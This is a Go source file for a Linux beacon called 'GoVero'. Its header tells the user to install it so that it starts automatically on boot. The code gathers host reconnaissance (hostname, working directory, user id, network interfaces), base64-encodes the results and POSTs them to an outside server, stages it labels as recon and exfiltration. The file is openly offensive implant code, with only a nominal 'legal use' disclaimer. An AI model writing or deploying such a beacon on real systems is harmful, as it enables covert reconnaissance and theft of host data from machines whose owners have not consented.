/*
GoVero Is A Beacon Software, Use It Only In Legal Situations.
GoVero Sends A Request To Your Server Every Minute.
It Should Be Placed In A Location Where It'll Be Automatically Started Whenever The Device Is Up
THIS IS THE LINUX VERSION
*/

package main

import (
	"encoding/base64"
	"fmt"
	"net/http"
	"net/url"
	"os/exec"
	"runtime"
	"time"
)

func main() {
	// time.Sleep(8 * time.Second) // Sleeping For A Specified Time
	// req, err := http.Get("http://127.0.0.1:8000")
	// fmt.Print(req)
	// fmt.Print(err)

	// Recon Stage

	osinfo := runtime.GOOS
	if osinfo == "windows" {
		return
	}

	hostname, err1 := exec.Command("hostname").Output()
	curdir, err2 := exec.Command("pwd").Output()
	userid, err3 := exec.Command("id").Output()
	networkinfo, err4 := exec.Command("ip", "a", "s").Output()

	if err1 != nil || err2 != nil || err3 != nil || err4 != nil {
		fmt.Print(err1, err2, err3, err4)
	}

	time.Sleep(8 * time.Second) // Sleeping For A Specified Time

	// Exfiltration

	// Encoding

	// Base64

	hostbs64 := base64.StdEncoding.EncodeToString(hostname)
	dirbs64 := base64.StdEncoding.EncodeToString(curdir)
	userbs64 := base64.StdEncoding.EncodeToString(userid)
	networkbs64 := base64.StdEncoding.EncodeToString(networkinfo)

	fmt.Println(hostbs64)
	fmt.Println(dirbs64)
	fmt.Println(userbs64)
	fmt.Println(networkbs64)

	time.Sleep(8 * time.Second) // Sleeping For A Specified Time

	// Encrypting

	// Beaconing

	data := url.Values{
		"hostbs64":    {hostbs64},
		"dirbs64":     {dirbs64},
		"userbs64":    {userbs64},
		"networkbs64": {networkbs64},
	}

	http.PostForm("https://httpbin.org/post", data)

}
